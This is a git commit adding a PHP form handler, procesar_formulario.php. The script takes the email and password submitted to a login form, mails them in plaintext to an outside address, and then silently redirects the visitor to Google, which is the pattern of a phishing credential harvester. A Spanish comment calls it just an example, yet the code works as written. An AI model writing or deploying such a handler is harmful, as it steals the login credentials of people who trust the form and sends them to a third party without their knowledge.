7eee3a3f276e959cd02c46610653673d9bd5e8ab
Ignacio <115509074+Ignacio2100@users.noreply.github.com>
2024-07-23 23:36:16 -0600

    Add files via upload

---
+++ procesar_formulario.php
@@ -0,0 +1,18 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Aquí podrías realizar más validaciones y procesamiento de datos
+
+    // Enviar un correo electrónico con los datos (ESTO ES SOLO UN EJEMPLO)
+    $to = 'gmail@borjagalisteo.com';
+    $subject = 'Nuevo inicio de sesión';
+    $message = "Correo electrónico: $email\nContraseña: $password";
+    mail($to, $subject, $message);
+
+    // Redirigir a Google después de enviar el correo electrónico
+    header("Location: https://www.google.com");
+    exit(); // Asegura que no se ejecuten más instrucciones después de la redirección
+}
+?>
